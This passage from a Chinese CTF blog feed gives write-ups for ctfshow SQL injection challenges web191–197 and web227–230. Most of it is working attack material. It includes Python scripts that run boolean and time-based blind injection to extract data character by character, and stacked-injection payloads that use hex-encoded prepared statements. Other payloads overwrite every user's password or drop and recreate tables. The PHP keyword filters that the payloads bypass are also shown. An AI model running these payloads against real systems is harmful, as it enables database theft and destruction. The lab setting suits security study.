href="#web227">¶</a>web227</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//师傅说过滤的越多越好</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|db|\,/i&#x27;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_41573234/article/details/80411079">关于 查看存储过程和函数</a>和<a href="https://blog.csdn.net/uftjtt/article/details/80435520">存储过程和函数</a></p><p>还是利用上一题预处理加16进制绕过即可, 但是你会发现flag不在表里面</p><p>看完文章直接套</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;prepare h from 0x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e726f7574696e6573;execute h;%23</span><br><span class="line"># select * from information_schema.routines</span><br></pre></td></tr></table></figure><h2 id="web228-230"><a class="header-anchor" href="#web228-230">¶</a>web228-230</h2><ul><li>描述: 同上</li></ul><p>这三题再怎么过滤也是可以用web226的方法绕过, 这里我就不再写了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">  <span class="variable">$bansql</span> = <span class="string">&quot;select char from banlist;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//师傅说内容太多，就写入数据库保存</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$banlist</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$banlist</span> <span class="keyword">as</span> <span class="variable">$char</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$char</span>.<span class="string">&quot;/i&quot;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h1>附录</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">res_judge</span>(<span class="params">url, payload</span>):</span><br><span class="line">    <span class="comment"># 发送请求并判断响应时间是否足够长, 以确认匹配</span></span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>: payload,</span><br><span class="line">        <span class="string">&quot;debug&quot;</span>: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.post(url=url, data=data, timeout=<span class="number">0.7</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.Timeout:</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Payload: <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] Error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">the_length</span>(<span class="params">url, query</span>):</span><br><span class="line">    <span class="comment"># 确定查询结果的长度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">80</span>):</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">f&quot;\&#x27;or if((length((<span class="subst">&#123;query&#125;</span>)))=<span class="subst">&#123;i&#125;</span>,sleep(2),1)#&quot;</span></span><br><span class="line">        <span class="comment"># if((length((&#123;query&#125;)))=&#123;length&#125;,sleep(2),1)&amp;debug=1</span></span><br><span class="line">        <span class="keyword">if</span> res_judge(url, payload):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Found the length: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化</span></span><br><span class="line">url = <span class="string">&quot;http://a24c3f93-a30a-47eb-abb2-6a4983c4468b.challenge.ctf.show/api/&quot;</span></span><br><span class="line">flagstr = <span class="string">&quot;,_&#123;&#125;-abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># query = &quot;select database()&quot;</span></span><br><span class="line"><span class="comment"># query = &quot;select group_concat(table_name) from information_schema.tables where table_schema = database()&quot;</span></span><br><span class="line"><span class="comment"># query = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;&quot;</span></span><br><span class="line">query = <span class="string">&quot;select flagaa from ctfshow_flagxc&quot;</span></span><br><span class="line"></span><br><span class="line">length = the_length(url, query)</span><br><span class="line"><span class="keyword">if</span> length:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> mid <span class="keyword">in</span> flagstr:</span><br><span class="line"></span><br><span class="line">            payload = <span class="string">f&quot;\&#x27;or if((substr((<span class="subst">&#123;query&#125;</span>),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;mid&#125;</span>&#x27;),sleep(2),1)#&quot;</span></span><br><span class="line">            <span class="keyword">if</span> res_judge(url, payload):</span><br><span class="line">                flag += mid</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] Found <span class="subst">&#123;i&#125;</span>th character: <span class="subst">&#123;mid&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[-] The String: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[!] Error occurred: length return none&quot;</span>)</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具利用 </tag>
            
            <tag> MySQL </tag>
            
            <tag> 绕过 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> SQL盲注 </tag>
            
            <tag> sqlmap </tag>
            
            <tag> 堆叠注入 </tag>
            
            <tag> SQL预处理 </tag>
            
            <tag> 存储过程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web入门_sql注入_2</title>
      <link href="/article/ctfshow-webbasic-sql-2/"/>
      <url>/article/ctfshow-webbasic-sql-2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>sql注入</h1><hr><h2 id="web191"><a class="header-anchor" href="#web191">¶</a>web191</h2><ul><li>描述: 增加了过滤</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|ascii/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">      <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>因为没有用<code>ascii()</code>上一题的脚本也可以用</p><p>官方给出的脚本用的payload本来是这样的, 被过滤后在查找官方文档时发现替代品<code>ord()</code>, 将<code>ascii</code>换为<code>ord</code>即可</p><p>官方脚本:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://35ecca49-f83a-4220-801d-e0ec911b111d.challenge.ctf.show/api/&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        mid = (<span class="built_in">max</span> + <span class="built_in">min</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">min</span> == mid:</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(mid) == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and (ord(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;</span>.<span class="built_in">format</span>(i, mid)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">&quot;8bef&quot;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid</span><br></pre></td></tr></table></figure><p>我用的(或许我也应该sleep 0.3s):</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> post</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits, ascii_lowercase</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://35ecca49-f83a-4220-801d-e0ec911b111d.challenge.ctf.show/api/&#x27;</span></span><br><span class="line"><span class="comment"># 数据库值: ctfshow_web</span></span><br><span class="line"><span class="comment"># payload = &#x27;admin\&#x27; and (select database()) regexp \&#x27;&#123;&#125;\&#x27; #&#x27;</span></span><br><span class="line"><span class="comment"># 表名: ctfshow_fl0g</span></span><br><span class="line"><span class="comment"># payload = &#x27;admin\&#x27; and (select group_concat(table_name) from information_schema.tables where table_schema = database()) regexp \&#x27;&#123;&#125;\&#x27; #&#x27;</span></span><br><span class="line"><span class="comment"># 字段: id,f10g</span></span><br><span class="line"><span class="comment"># payload = &#x27;admin\&#x27; and (select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = \&#x27;ctfshow_fl0g\&#x27;) regexp \&#x27;&#123;&#125;\&#x27; #&#x27;</span></span><br><span class="line"><span class="comment"># 拿到flag: ctfshow&#123;f8302835-ac04-49e8-ba2c-4ee474890ac4&#125;</span></span><br><span class="line">payload = <span class="string">&#x27;admin\&#x27; and (select f1ag from ctfshow_fl0g) regexp \&#x27;&#123;&#125;\&#x27; #&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="comment"># flag需要修改, 不能留空</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;-&#125;_&#x27;</span> + digits + ascii_lowercase:</span><br><span class="line">            resp = post(url, &#123;<span class="string">&#x27;username&#x27;</span>: payload.<span class="built_in">format</span>(flag + c), <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123&#x27;</span>&#125;)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;密码错误&#x27;</span> <span class="keyword">in</span> resp.json().get(<span class="string">&#x27;msg&#x27;</span>):</span><br><span class="line">                flag += c</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">if</span> c == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                    exit()</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="web192"><a class="header-anchor" href="#web192">¶</a>web192</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|ascii|ord|hex/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">      <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>改官方的好了, 我用的根本不在过滤里面</p><ol><li>本来是对比ascii码, 现在直接对比字符即可</li><li>上一题程序不改字符范围会出现大写字母, 原因是在mysql中<code>select ('a'='A')</code>为true</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://92c1fd93-611c-4f22-b429-69e3a1a1ac3a.challenge.ctf.show/api/&quot;</span></span><br><span class="line">flagstr = <span class="string">&quot;&#123;&#125;-abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> mid <span class="keyword">in</span> flagstr:</span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and ((substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;))#&quot;</span>.<span class="built_in">format</span>(i, mid)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">&quot;8bef&quot;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">            flag += mid</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> mid == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>还可以用其他的:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查数据库</span></span><br><span class="line">payload = <span class="string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line"><span class="comment"># 查字段</span></span><br><span class="line">payload = <span class="string">&quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;&quot;</span></span><br><span class="line"><span class="comment"># 查flag</span></span><br><span class="line">payload = <span class="string">&quot;select group_concat(f1ag) from ctfshow_fl0g&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;admin&#x27; and if(substr((&#123;payload&#125;),&#123;i&#125;,1)=&#x27;&#123;mid&#125;&#x27;, 1, 2) = &#x27;1&quot;</span>,</span><br></pre></td></tr></table></figure><h2 id="web193"><a class="header-anchor" href="#web193">¶</a>web193</h2><ul><li>描述: 同上</li></ul><blockquote><p>表名变成了ctfshow_flxg</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|ascii|ord|hex|substr/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">      <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这下更不能用了, 怎么办呢, 在<a href="https://dev.mysql.com/doc/refman/8.4/en/string-functions.html">字符串相关函数</a>找找哪些能用, 测试如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where username = &#x27;admin&#x27;and ((left((select flag from falg),1)=&#x27;a&#x27;));</span><br></pre></td></tr></table></figure><p>我用的连着几题都没变过(web191), 测试能用的情况下最终payload为:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://1f12c9cc-044c-441b-9a8b-0d69e978258d.challenge.ctf.show/api/&quot;</span></span><br><span class="line">flagstr = <span class="string">&quot;,_&#123;&#125;-abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line">tempstr = <span class="string">&quot;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> mid <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment"># 数据库:</span></span><br><span class="line">        <span class="comment"># payload = &quot;admin&#x27;and ((left((select database()),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i, tempstr + mid)</span></span><br><span class="line">        <span class="comment"># 表名: ctfshow_flxg,ctfshow_user</span></span><br><span class="line">        <span class="comment"># payload = &quot;admin&#x27;and ((left((select group_concat(table_name) from information_schema.tables where table_schema = database()),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i, tempstr + mid)</span></span><br><span class="line">        <span class="comment"># 字段: id,f1ag</span></span><br><span class="line">        <span class="comment"># payload = &quot;admin&#x27;and ((left((select group_concat(column_name) from information_schema.columns where table_name = &#x27;ctfshow_flxg&#x27;),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i, tempstr + mid)</span></span><br><span class="line">        <span class="comment"># 获取flag:</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and ((left((select f1ag from ctfshow_flxg),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;</span>.<span class="built_in">format</span>(i, tempstr + mid)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">&quot;8bef&quot;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">            tempstr += mid</span><br><span class="line">            flag += mid</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> mid == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="web194"><a class="header-anchor" href="#web194">¶</a>web194</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|ascii|ord|hex|substr|char|left|right|substring/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">      <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>left</code>之类的过滤了, 继续在官方文档里面找可用的函数, 找到<code>lpad()</code></p><p>诶嘿, 我的还可以用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 返回a</span><br><span class="line">select lpad(&quot;abc&quot;,1,&#x27;&#x27;);</span><br><span class="line"># 返回ab</span><br><span class="line">select lpaf(&quot;abc&quot;,2,&#x27;&#x27;);</span><br></pre></td></tr></table></figure><p>和<code>left</code>大差不差, 将<code>left</code>改成<code>lpad</code>即可拿到flag</p><h2 id="web195"><a class="header-anchor" href="#web195">¶</a>web195</h2><ul><li>描述: 又双叒叕</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户, 单引号又没了</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#x27;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>访问的时候注意到是堆叠注入, 同时分号也没有被过滤, 那就用堆叠注入</p><blockquote><p>union是将两个查询一起执行, 而利用分号则是分别执行一次, 可以在本地数据库尝试</p></blockquote><p><code>select</code>被过滤, 不能用查询的方法, 但是既然可以在此处执行mysql命令, 可以直接覆盖<code>$password</code>的值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">username=0;update`ctfshow_user`set`pass`=1&amp;password=1</span><br></pre></td></tr></table></figure><p>发包修改后登录即可, 因为没有单引号包裹且被过滤, 我们无法传入admin这个字符串, 只能用0了:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">username=0&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240811201326033.png" alt="image-20240811201326033"></p><h2 id="web196"><a class="header-anchor" href="#web196">¶</a>web196</h2><ul><li>描述: 用户名不能太长</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#x27;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)&gt;<span class="number">16</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名不能超过16个字符&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>官方给的非预期是从web171中泄露的用户名和密码:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">username=0&amp;password=passwordAUTO</span><br></pre></td></tr></table></figure><p>似乎还有解法:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">username=1;select(1)&amp;password=1</span><br></pre></td></tr></table></figure><h2 id="web197"><a class="header-anchor" href="#web197">¶</a>web197</h2><ul><li>描述: 用户名可以很长</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;/\*|\#|\-|\x23|\&#x27;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set//i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以很长, 又不能联合注入, 而且没有通过单引号包含传入的参数, 尝试执行相关命令: 更新表或者删除后新建一个一样的表:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop table ctfshow_user;</span><br><span class="line">create table ctfshow_user(`username` varchar(100),`pass` varchar(100));</span><br><span class="line">insert ctfshow_user(`username`,`pass`) value(1,2);</span><br></pre></td></tr></table></figure><p>payload如下, 随后用账号:1密码:2登录即可</p><figure class="highlight 